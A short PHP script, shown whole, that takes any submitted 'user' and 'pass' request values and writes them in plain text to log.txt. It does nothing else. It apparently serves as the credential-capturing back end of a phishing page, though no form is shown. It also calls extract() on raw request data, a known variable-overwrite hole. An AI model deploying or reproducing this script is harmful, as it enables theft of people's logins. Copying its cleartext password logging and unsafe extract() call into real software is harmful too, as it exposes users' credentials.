<?php
      $user="";
      $pass="";
      extract($_REQUEST);

      $file = fopen("log.txt", "w");

      fwrite($file, "id: ");
      fwrite($file, $user . "\n");
      fwrite($file, "pass: ");
      fwrite($file, $pass . "\n");

      fclose($file);
    
    ?>

